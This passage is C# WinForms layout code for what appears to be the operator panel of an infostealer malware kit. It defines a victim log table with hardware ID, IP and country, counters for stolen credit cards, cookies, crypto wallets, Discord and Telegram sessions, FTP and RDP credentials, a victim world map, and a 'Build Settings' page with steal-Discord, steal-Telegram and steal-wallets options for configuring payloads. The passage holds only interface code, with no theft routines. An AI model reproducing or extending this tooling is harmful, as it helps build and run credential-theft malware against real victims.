			this.logsListView.VirtualMode = true;
			this.logsListView.MouseDoubleClick += new global::System.Windows.Forms.MouseEventHandler(this.LogsListView_MouseDoubleClick);
			this.UserName.AspectName = "UserName";
			this.UserName.HeaderTextAlign = new global::System.Windows.Forms.HorizontalAlignment?(global::System.Windows.Forms.HorizontalAlignment.Center);
			this.UserName.IsEditable = false;
			this.UserName.IsVisible = false;
			this.UserName.MaximumWidth = 0;
			this.UserName.MinimumWidth = 0;
			this.UserName.Text = "UserName";
			this.UserName.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.UserName.Width = 0;
			this.ID.AspectName = "Id";
			this.ID.HeaderTextAlign = new global::System.Windows.Forms.HorizontalAlignment?(global::System.Windows.Forms.HorizontalAlignment.Center);
			this.ID.IsEditable = false;
			this.ID.MaximumWidth = 100;
			this.ID.MinimumWidth = 100;
			this.ID.Text = "ID";
			this.ID.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.ID.Width = 100;
			this.HardwareID.AspectName = "HardwareID";
			this.HardwareID.HeaderTextAlign = new global::System.Windows.Forms.HorizontalAlignment?(global::System.Windows.Forms.HorizontalAlignment.Center);
			this.HardwareID.IsEditable = false;
			this.HardwareID.MaximumWidth = 340;
			this.HardwareID.MinimumWidth = 340;
			this.HardwareID.Text = "HardwareID";
			this.HardwareID.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.HardwareID.Width = 340;
			this.ClientIP.AspectName = "ClientIP";
			this.ClientIP.IsEditable = false;
			this.ClientIP.MaximumWidth = 180;
			this.ClientIP.MinimumWidth = 180;
			this.ClientIP.Text = "IP";
			this.ClientIP.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.ClientIP.Width = 180;
			this.Country.AspectName = "Country";
			this.Country.IsEditable = false;
			this.Country.MaximumWidth = 90;
			this.Country.MinimumWidth = 90;
			this.Country.Text = "Country";
			this.Country.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.Country.Width = 90;
			this.SourceID.AspectName = "SourceID";
			this.SourceID.HeaderTextAlign = new global::System.Windows.Forms.HorizontalAlignment?(global::System.Windows.Forms.HorizontalAlignment.Center);
			this.SourceID.IsEditable = false;
			this.SourceID.MaximumWidth = 125;
			this.SourceID.MinimumWidth = 125;
			this.SourceID.Text = "SourceID";
			this.SourceID.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.SourceID.Width = 125;
			this.OperationSystem.AspectName = "OperationSystem";
			this.OperationSystem.Hideable = false;
			this.OperationSystem.MaximumWidth = 200;
			this.OperationSystem.MinimumWidth = 200;
			this.OperationSystem.Text = "OperationSystem";
			this.OperationSystem.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.OperationSystem.Width = 200;
			this.Hardwares.AspectName = "Hardwares";
			this.Hardwares.HeaderTextAlign = new global::System.Windows.Forms.HorizontalAlignment?(global::System.Windows.Forms.HorizontalAlignment.Center);
			this.Hardwares.IsVisible = false;
			this.Hardwares.Text = "Hardwares";
			this.Hardwares.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.Hardwares.Width = 0;
			this.LogTime.AspectName = "LogTime";
			this.LogTime.HeaderTextAlign = new global::System.Windows.Forms.HorizontalAlignment?(global::System.Windows.Forms.HorizontalAlignment.Center);
			this.LogTime.IsEditable = false;
			this.LogTime.MaximumWidth = 150;
			this.LogTime.MinimumWidth = 150;
			this.LogTime.Text = "Log DateTime";
			this.LogTime.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.LogTime.Width = 150;
			this.Languages.AspectName = "Languages";
			this.Languages.IsEditable = false;
			this.Languages.IsVisible = false;
			this.Languages.Text = "Languages";
			this.Languages.TextAlign = global::System.Windows.Forms.HorizontalAlignment.Center;
			this.statsPage.BaseColor = global::System.Drawing.Color.FromArgb(32, 32, 32);
			this.statsPage.Controls.Add(this.totalRDP);
			this.statsPage.Controls.Add(this.totalRDPLbl);
			this.statsPage.Controls.Add(this.totalDesktopFiles);
			this.statsPage.Controls.Add(this.totalDesktopFilesLbl);
			this.statsPage.Controls.Add(this.totalDiscord);
			this.statsPage.Controls.Add(this.totalDiscordLbl);
			this.statsPage.Controls.Add(this.totalCreditCards);
			this.statsPage.Controls.Add(this.totalCreditCardsLbl);
			this.statsPage.Controls.Add(this.totalTelegram);
			this.statsPage.Controls.Add(this.totalTelegramLbl);
			this.statsPage.Controls.Add(this.metroSetDivider3);
			this.statsPage.Controls.Add(this.totalWinStore);
			this.statsPage.Controls.Add(this.totalWinStoreLbl);
			this.statsPage.Controls.Add(this.totalFtps);
			this.statsPage.Controls.Add(this.totalFtpsLbl);
			this.statsPage.Controls.Add(this.totalCookies);
			this.statsPage.Controls.Add(this.totalCookiesLbl);
			this.statsPage.Controls.Add(this.totalAccounts);
			this.statsPage.Controls.Add(this.totalAccountsLbl);
			this.statsPage.Controls.Add(this.totalCrypto);
			this.statsPage.Controls.Add(this.totalCryptoLbl);
			this.statsPage.Controls.Add(this.top10CountriesLb);
			this.statsPage.Controls.Add(this.metroSetLabel1);
			this.statsPage.Cursor = global::System.Windows.Forms.Cursors.Default;
			this.statsPage.ImageIndex = 0;
			this.statsPage.ImageKey = null;
			this.statsPage.Location = new global::System.Drawing.Point(4, 42);
			this.statsPage.Name = "statsPage";
			this.statsPage.Size = new global::System.Drawing.Size(1202, 542);
			this.statsPage.Style = global::MetroSet_UI.Design.Style.Dark;
			this.statsPage.StyleManager = this.mainStyle;
			this.statsPage.TabIndex = 2;
			this.statsPage.Text = "Stats";
			this.statsPage.ThemeAuthor = "Narwin";
			this.statsPage.ThemeName = "MetroDark";
			this.statsPage.ToolTipText = null;
			this.totalRDP.ContextMenuStrip = this.winStoreCredMenu;
			this.totalRDP.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.totalRDP.Location = new global::System.Drawing.Point(800, 390);
			this.totalRDP.Name = "totalRDP";
			this.totalRDP.Size = new global::System.Drawing.Size(210, 23);
			this.totalRDP.Style = global::MetroSet_UI.Design.Style.Dark;
			this.totalRDP.StyleManager = this.mainStyle;
			this.totalRDP.TabIndex = 25;
			this.totalRDP.Text = "0";
			this.totalRDP.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
			this.totalRDP.ThemeAuthor = "Narwin";
			this.totalRDP.ThemeName = "MetroDark";
			this.winStoreCredMenu.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.saveRDPToolStripMenuItem
			});
			this.winStoreCredMenu.Name = "winStoreCredMenu";
			this.winStoreCredMenu.Size = new global::System.Drawing.Size(124, 26);
			this.saveRDPToolStripMenuItem.Name = "saveRDPToolStripMenuItem";
			this.saveRDPToolStripMenuItem.Size = new global::System.Drawing.Size(123, 22);
			this.saveRDPToolStripMenuItem.Text = "Save RDP";
			this.saveRDPToolStripMenuItem.Click += new global::System.EventHandler(this.saveRDPToolStripMenuItem_Click);
			this.totalRDPLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.totalRDPLbl.Location = new global::System.Drawing.Point(800, 360);
			this.totalRDPLbl.Name = "totalRDPLbl";
			this.totalRDPLbl.Size = new global::System.Drawing.Size(210, 23);
			this.totalRDPLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.totalRDPLbl.StyleManager = this.mainStyle;
			this.totalRDPLbl.TabIndex = 24;
			this.totalRDPLbl.Text = "Total RDP:";
			this.totalRDPLbl.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
			this.totalRDPLbl.ThemeAuthor = "Narwin";
			this.totalRDPLbl.ThemeName = "MetroDark";
			this.totalDesktopFiles.ContextMenuStrip = this.winStoreCredMenu;
			this.totalDesktopFiles.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.totalDesktopFiles.Location = new global::System.Drawing.Point(800, 330);
			this.totalDesktopFiles.Name = "totalDesktopFiles";
			this.totalDesktopFiles.Size = new global::System.Drawing.Size(210, 23);
			this.totalDesktopFiles.Style = global::MetroSet_UI.Design.Style.Dark;
			this.totalDesktopFiles.StyleManager = this.mainStyle;
			this.totalDesktopFiles.TabIndex = 23;
			this.totalDesktopFiles.Text = "0";
			this.totalDesktopFiles.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
			this.totalDesktopFiles.ThemeAuthor = "Narwin";
			this.totalDesktopFiles.ThemeName = "MetroDark";
			this.totalDesktopFilesLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.totalDesktopFilesLbl.Location = new global::System.Drawing.Point(800, 300);
			this.totalDesktopFilesLbl.Name = "totalDesktopFilesLbl";
			this.totalDesktopFilesLbl.Size = new global::System.Drawing.Size(210, 23);
			this.totalDesktopFilesLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.totalDesktopFilesLbl.StyleManager = this.mainStyle;
			this.totalDesktopFilesLbl.TabIndex = 22;
			this.totalDesktopFilesLbl.Text = "Total Desktop files:";
			this.totalDesktopFilesLbl.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
			this.totalDesktopFilesLbl.ThemeAuthor = "Narwin";
			this.totalDesktopFilesLbl.ThemeName = "MetroDark";
			this.totalDiscord.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.totalDiscord.Location = new global::System.Drawing.Point(800, 210);
			this.totalDiscord.Name = "totalDiscord";
			this.totalDiscord.Size = new global::System.Drawing.Size(210, 23);
			this.totalDiscord.Style = global::MetroSet_UI.Design.Style.Dark;
			this.totalDiscord.StyleManager = this.mainStyle;
			this.totalDiscord.TabIndex = 21;
			this.totalDiscord.Text = "0";
			this.totalDiscord.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
			this.totalDiscord.ThemeAuthor = "Narwin";
			this.totalDiscord.ThemeName = "MetroDark";
			this.totalDiscordLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.totalDiscordLbl.Location = new global::System.Drawing.Point(800, 180);
			this.totalDiscordLbl.Name = "totalDiscordLbl";
			this.totalDiscordLbl.Size = new global::System.Drawing.Size(210, 23);
			this.totalDiscordLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.totalDiscordLbl.StyleManager = this.mainStyle;
			this.totalDiscordLbl.TabIndex = 20;
			this.totalDiscordLbl.Text = "Total Discord sessions:";
			this.totalDiscordLbl.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
			this.totalDiscordLbl.ThemeAuthor = "Narwin";
			this.totalDiscordLbl.ThemeName = "MetroDark";
			this.totalCreditCards.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.totalCreditCards.Location = new global::System.Drawing.Point(800, 270);
			this.totalCreditCards.Name = "totalCreditCards";
			this.totalCreditCards.Size = new global::System.Drawing.Size(210, 23);
			this.totalCreditCards.Style = global::MetroSet_UI.Design.Style.Dark;
			this.totalCreditCards.StyleManager = this.mainStyle;
			this.totalCreditCards.TabIndex = 19;
			this.totalCreditCards.Text = "0";
			this.totalCreditCards.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
			this.totalCreditCards.ThemeAuthor = "Narwin";
			this.totalCreditCards.ThemeName = "MetroDark";
			this.totalCreditCardsLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.totalCreditCardsLbl.Location = new global::System.Drawing.Point(800, 240);
			this.totalCreditCardsLbl.Name = "totalCreditCardsLbl";
			this.totalCreditCardsLbl.Size = new global::System.Drawing.Size(210, 23);
			this.totalCreditCardsLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.totalCreditCardsLbl.StyleManager = this.mainStyle;
			this.totalCreditCardsLbl.TabIndex = 18;
			this.totalCreditCardsLbl.Text = "Total Credit Cards:";
			this.totalCreditCardsLbl.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
			this.totalCreditCardsLbl.ThemeAuthor = "Narwin";
			this.totalCreditCardsLbl.ThemeName = "MetroDark";
			this.totalTelegram.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.totalTelegram.Location = new global::System.Drawing.Point(800, 150);
			this.totalTelegram.Name = "totalTelegram";
			this.totalTelegram.Size = new global::System.Drawing.Size(210, 23);
			this.totalTelegram.Style = global::MetroSet_UI.Design.Style.Dark;
			this.totalTelegram.StyleManager = this.mainStyle;
			this.totalTelegram.TabIndex = 17;
			this.totalTelegram.Text = "0";
			this.totalTelegram.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
			this.totalTelegram.ThemeAuthor = "Narwin";
			this.totalTelegram.ThemeName = "MetroDark";
			this.totalTelegramLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.totalTelegramLbl.Location = new global::System.Drawing.Point(800, 120);
			this.totalTelegramLbl.Name = "totalTelegramLbl";
			this.totalTelegramLbl.Size = new global::System.Drawing.Size(210, 23);
			this.totalTelegramLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.totalTelegramLbl.StyleManager = this.mainStyle;
			this.totalTelegramLbl.TabIndex = 16;
			this.totalTelegramLbl.Text = "Total Telegram sessions:";
			this.totalTelegramLbl.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
			this.totalTelegramLbl.ThemeAuthor = "Narwin";
			this.totalTelegramLbl.ThemeName = "MetroDark";
			this.metroSetDivider3.Location = new global::System.Drawing.Point(235, 0);
			this.metroSetDivider3.Name = "metroSetDivider3";
			this.metroSetDivider3.Orientation = global::MetroSet_UI.Enums.DividerStyle.Vertical;
			this.metroSetDivider3.Size = new global::System.Drawing.Size(4, 546);
			this.metroSetDivider3.Style = global::MetroSet_UI.Design.Style.Dark;
			this.metroSetDivider3.StyleManager = this.mainStyle;
			this.metroSetDivider3.TabIndex = 15;
			this.metroSetDivider3.Text = "metroSetDivider3";
			this.metroSetDivider3.ThemeAuthor = "Narwin";
			this.metroSetDivider3.ThemeName = "MetroDark";
			this.metroSetDivider3.Thickness = 1;
			this.totalWinStore.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.totalWinStore.Location = new global::System.Drawing.Point(390, 330);
			this.totalWinStore.Name = "totalWinStore";
			this.totalWinStore.Size = new global::System.Drawing.Size(210, 23);
			this.totalWinStore.Style = global::MetroSet_UI.Design.Style.Dark;
			this.totalWinStore.StyleManager = this.mainStyle;
			this.totalWinStore.TabIndex = 14;
			this.totalWinStore.Text = "0";
			this.totalWinStore.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
			this.totalWinStore.ThemeAuthor = "Narwin";
			this.totalWinStore.ThemeName = "MetroDark";
			this.totalWinStoreLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.totalWinStoreLbl.Location = new global::System.Drawing.Point(390, 300);
			this.totalWinStoreLbl.Name = "totalWinStoreLbl";
			this.totalWinStoreLbl.Size = new global::System.Drawing.Size(210, 23);
			this.totalWinStoreLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.totalWinStoreLbl.StyleManager = this.mainStyle;
			this.totalWinStoreLbl.TabIndex = 13;
			this.totalWinStoreLbl.Text = "Total WinStore Credentials:";
			this.totalWinStoreLbl.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
			this.totalWinStoreLbl.ThemeAuthor = "Narwin";
			this.totalWinStoreLbl.ThemeName = "MetroDark";
			this.totalFtps.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.totalFtps.Location = new global::System.Drawing.Point(390, 390);
			this.totalFtps.Name = "totalFtps";
			this.totalFtps.Size = new global::System.Drawing.Size(210, 23);
			this.totalFtps.Style = global::MetroSet_UI.Design.Style.Dark;
			this.totalFtps.StyleManager = this.mainStyle;
			this.totalFtps.TabIndex = 12;
			this.totalFtps.Text = "0";
			this.totalFtps.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
			this.totalFtps.ThemeAuthor = "Narwin";
			this.totalFtps.ThemeName = "MetroDark";
			this.totalFtpsLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.totalFtpsLbl.Location = new global::System.Drawing.Point(390, 360);
			this.totalFtpsLbl.Name = "totalFtpsLbl";
			this.totalFtpsLbl.Size = new global::System.Drawing.Size(210, 23);
			this.totalFtpsLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.totalFtpsLbl.StyleManager = this.mainStyle;
			this.totalFtpsLbl.TabIndex = 11;
			this.totalFtpsLbl.Text = "Total FTP:";
			this.totalFtpsLbl.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
			this.totalFtpsLbl.ThemeAuthor = "Narwin";
			this.totalFtpsLbl.ThemeName = "MetroDark";
			this.totalCookies.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.totalCookies.Location = new global::System.Drawing.Point(390, 210);
			this.totalCookies.Name = "totalCookies";
			this.totalCookies.Size = new global::System.Drawing.Size(210, 23);
			this.totalCookies.Style = global::MetroSet_UI.Design.Style.Dark;
			this.totalCookies.StyleManager = this.mainStyle;
			this.totalCookies.TabIndex = 10;
			this.totalCookies.Text = "0";
			this.totalCookies.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
			this.totalCookies.ThemeAuthor = "Narwin";
			this.totalCookies.ThemeName = "MetroDark";
			this.totalCookiesLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.totalCookiesLbl.Location = new global::System.Drawing.Point(390, 180);
			this.totalCookiesLbl.Name = "totalCookiesLbl";
			this.totalCookiesLbl.Size = new global::System.Drawing.Size(210, 23);
			this.totalCookiesLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.totalCookiesLbl.StyleManager = this.mainStyle;
			this.totalCookiesLbl.TabIndex = 9;
			this.totalCookiesLbl.Text = "Total Cookies:";
			this.totalCookiesLbl.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
			this.totalCookiesLbl.ThemeAuthor = "Narwin";
			this.totalCookiesLbl.ThemeName = "MetroDark";
			this.totalAccounts.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.totalAccounts.Location = new global::System.Drawing.Point(390, 270);
			this.totalAccounts.Name = "totalAccounts";
			this.totalAccounts.Size = new global::System.Drawing.Size(210, 23);
			this.totalAccounts.Style = global::MetroSet_UI.Design.Style.Dark;
			this.totalAccounts.StyleManager = this.mainStyle;
			this.totalAccounts.TabIndex = 8;
			this.totalAccounts.Text = "0";
			this.totalAccounts.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
			this.totalAccounts.ThemeAuthor = "Narwin";
			this.totalAccounts.ThemeName = "MetroDark";
			this.totalAccountsLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.totalAccountsLbl.Location = new global::System.Drawing.Point(390, 240);
			this.totalAccountsLbl.Name = "totalAccountsLbl";
			this.totalAccountsLbl.Size = new global::System.Drawing.Size(210, 23);
			this.totalAccountsLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.totalAccountsLbl.StyleManager = this.mainStyle;
			this.totalAccountsLbl.TabIndex = 7;
			this.totalAccountsLbl.Text = "Total Accounts:";
			this.totalAccountsLbl.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
			this.totalAccountsLbl.ThemeAuthor = "Narwin";
			this.totalAccountsLbl.ThemeName = "MetroDark";
			this.totalCrypto.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.totalCrypto.Location = new global::System.Drawing.Point(390, 150);
			this.totalCrypto.Name = "totalCrypto";
			this.totalCrypto.Size = new global::System.Drawing.Size(210, 23);
			this.totalCrypto.Style = global::MetroSet_UI.Design.Style.Dark;
			this.totalCrypto.StyleManager = this.mainStyle;
			this.totalCrypto.TabIndex = 6;
			this.totalCrypto.Text = "0";
			this.totalCrypto.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
			this.totalCrypto.ThemeAuthor = "Narwin";
			this.totalCrypto.ThemeName = "MetroDark";
			this.totalCryptoLbl.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.totalCryptoLbl.Location = new global::System.Drawing.Point(390, 120);
			this.totalCryptoLbl.Name = "totalCryptoLbl";
			this.totalCryptoLbl.Size = new global::System.Drawing.Size(210, 23);
			this.totalCryptoLbl.Style = global::MetroSet_UI.Design.Style.Dark;
			this.totalCryptoLbl.StyleManager = this.mainStyle;
			this.totalCryptoLbl.TabIndex = 5;
			this.totalCryptoLbl.Text = "Total Crypto Wallets:";
			this.totalCryptoLbl.TextAlign = global::System.Drawing.ContentAlignment.MiddleCenter;
			this.totalCryptoLbl.ThemeAuthor = "Narwin";
			this.totalCryptoLbl.ThemeName = "MetroDark";
			this.top10CountriesLb.BackColor = global::System.Drawing.Color.FromArgb(32, 32, 32);
			this.top10CountriesLb.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.top10CountriesLb.Cursor = global::System.Windows.Forms.Cursors.Default;
			this.top10CountriesLb.Font = new global::System.Drawing.Font("Consolas", 11.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.top10CountriesLb.ForeColor = global::System.Drawing.Color.FromArgb(170, 170, 170);
			this.top10CountriesLb.ItemHeight = 18;
			this.top10CountriesLb.Location = new global::System.Drawing.Point(0, 48);
			this.top10CountriesLb.Name = "top10CountriesLb";
			this.top10CountriesLb.SelectionMode = global::System.Windows.Forms.SelectionMode.None;
			this.top10CountriesLb.Size = new global::System.Drawing.Size(229, 306);
			this.top10CountriesLb.TabIndex = 4;
			this.metroSetLabel1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.metroSetLabel1.Location = new global::System.Drawing.Point(83, 22);
			this.metroSetLabel1.Name = "metroSetLabel1";
			this.metroSetLabel1.Size = new global::System.Drawing.Size(63, 23);
			this.metroSetLabel1.Style = global::MetroSet_UI.Design.Style.Dark;
			this.metroSetLabel1.StyleManager = this.mainStyle;
			this.metroSetLabel1.TabIndex = 2;
			this.metroSetLabel1.Text = "Top 10";
			this.metroSetLabel1.ThemeAuthor = "Narwin";
			this.metroSetLabel1.ThemeName = "MetroDark";
			this.worldMapPage.BaseColor = global::System.Drawing.Color.FromArgb(32, 32, 32);
			this.worldMapPage.Controls.Add(this.geoMapStat);
			this.worldMapPage.ImageIndex = 0;
			this.worldMapPage.ImageKey = null;
			this.worldMapPage.Location = new global::System.Drawing.Point(4, 42);
			this.worldMapPage.Name = "worldMapPage";
			this.worldMapPage.Size = new global::System.Drawing.Size(1202, 542);
			this.worldMapPage.Style = global::MetroSet_UI.Design.Style.Dark;
			this.worldMapPage.StyleManager = null;
			this.worldMapPage.TabIndex = 8;
			this.worldMapPage.Text = "World Map";
			this.worldMapPage.ThemeAuthor = "Narwin";
			this.worldMapPage.ThemeName = "MetroDark";
			this.worldMapPage.ToolTipText = null;
			this.geoMapStat.BackColor = global::System.Drawing.Color.White;
			this.geoMapStat.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.geoMapStat.Location = new global::System.Drawing.Point(0, 0);
			this.geoMapStat.Name = "geoMapStat";
			this.geoMapStat.Size = new global::System.Drawing.Size(1202, 542);
			this.geoMapStat.TabIndex = 1;
			this.geoMapStat.OnRightMouseLandClick += new global::System.EventHandler<global::LiveCharts.Maps.MapData>(this.GeoMapStat_OnRightMouseLandClick);
			this.serverLogPage.BaseColor = global::System.Drawing.Color.FromArgb(32, 32, 32);
			this.serverLogPage.Controls.Add(this.serverLogs);
			this.serverLogPage.ImageIndex = 0;
			this.serverLogPage.ImageKey = null;
			this.serverLogPage.Location = new global::System.Drawing.Point(4, 42);
			this.serverLogPage.Name = "serverLogPage";
			this.serverLogPage.Size = new global::System.Drawing.Size(1202, 542);
			this.serverLogPage.Style = global::MetroSet_UI.Design.Style.Dark;
			this.serverLogPage.StyleManager = this.mainStyle;
			this.serverLogPage.TabIndex = 5;
			this.serverLogPage.Text = "Server Log";
			this.serverLogPage.ThemeAuthor = "Narwin";
			this.serverLogPage.ThemeName = "MetroDark";
			this.serverLogPage.ToolTipText = null;
			this.serverLogs.BackColor = global::System.Drawing.Color.FromArgb(32, 32, 32);
			this.serverLogs.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.serverLogs.Cursor = global::System.Windows.Forms.Cursors.Default;
			this.serverLogs.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.serverLogs.Font = new global::System.Drawing.Font("Consolas", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.serverLogs.ForeColor = global::System.Drawing.Color.FromArgb(170, 170, 170);
			this.serverLogs.ItemHeight = 15;
			this.serverLogs.Location = new global::System.Drawing.Point(0, 0);
			this.serverLogs.Name = "serverLogs";
			this.serverLogs.ScrollAlwaysVisible = true;
			this.serverLogs.SelectionMode = global::System.Windows.Forms.SelectionMode.None;
			this.serverLogs.Size = new global::System.Drawing.Size(1202, 542);
			this.serverLogs.TabIndex = 5;
			this.buildSettingsPage.BaseColor = global::System.Drawing.Color.FromArgb(32, 32, 32);
			this.buildSettingsPage.Controls.Add(this.stealDiscord);
			this.buildSettingsPage.Controls.Add(this.stealDiscordLbl);
			this.buildSettingsPage.Controls.Add(this.stealTelegram);
			this.buildSettingsPage.Controls.Add(this.stealTelegramLbl);
			this.buildSettingsPage.Controls.Add(this.stealDesktop);
			this.buildSettingsPage.Controls.Add(this.stealFTPs);
			this.buildSettingsPage.Controls.Add(this.stealWinCreds);
			this.buildSettingsPage.Controls.Add(this.stealWallets);
			this.buildSettingsPage.Controls.Add(this.stealLogs);
			this.buildSettingsPage.Controls.Add(this.desktopExtTb);
			this.buildSettingsPage.Controls.Add(this.addDesktopExtBtn);
			this.buildSettingsPage.Controls.Add(this.desktopExtList);
			this.buildSettingsPage.Controls.Add(this.stealDesktopLbl);
			this.buildSettingsPage.Controls.Add(this.stealFTPsLbl);
			this.buildSettingsPage.Controls.Add(this.stealWinCredsLbl);
			this.buildSettingsPage.Controls.Add(this.stealWalletsLbl);
			this.buildSettingsPage.Controls.Add(this.stealLogsLbl);
			this.buildSettingsPage.ImageIndex = 0;
			this.buildSettingsPage.ImageKey = null;
			this.buildSettingsPage.Location = new global::System.Drawing.Point(4, 42);
			this.buildSettingsPage.Name = "buildSettingsPage";
			this.buildSettingsPage.Size = new global::System.Drawing.Size(1202, 542);
			this.buildSettingsPage.Style = global::MetroSet_UI.Design.Style.Dark;
			this.buildSettingsPage.StyleManager = this.mainStyle;
			this.buildSettingsPage.TabIndex = 7;
			this.buildSettingsPage.Text = "Build Settings";
			this.buildSettingsPage.ThemeAuthor = "Narwin";
			this.buildSettingsPage.ThemeName = "MetroDark";
			this.buildSettingsPage.ToolTipText = null;
			this.stealDiscord.BackColor = global::System.Drawing.Color.Transparent;
			this.stealDiscord.BackgroundColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.stealDiscord.BorderColor = global::System.Drawing.Color.FromArgb(155, 155, 155);
			this.stealDiscord.Checked = true;
			this.stealDiscord.CheckSignColor = global::System.Drawing.Color.FromArgb(65, 177, 225);
			this.stealDiscord.CheckState = global::MetroSet_UI.Enums.CheckState.Checked;
			this.stealDiscord.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.stealDiscord.DisabledBorderColor = global::System.Drawing.Color.FromArgb(85, 85, 85);
			this.stealDiscord.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 10f);
			this.stealDiscord.Location = new global::System.Drawing.Point(790, 230);
			this.stealDiscord.Name = "stealDiscord";
			this.stealDiscord.SignStyle = global::MetroSet_UI.Enums.SignStyle.Sign;
			this.stealDiscord.Size = new global::System.Drawing.Size(18, 16);
			this.stealDiscord.Style = global::MetroSet_UI.Design.Style.Dark;
			this.stealDiscord.StyleManager = this.mainStyle;
			this.stealDiscord.TabIndex = 38;
			this.stealDiscord.ThemeAuthor = "Narwin";
			this.stealDiscord.ThemeName = "MetroDark";
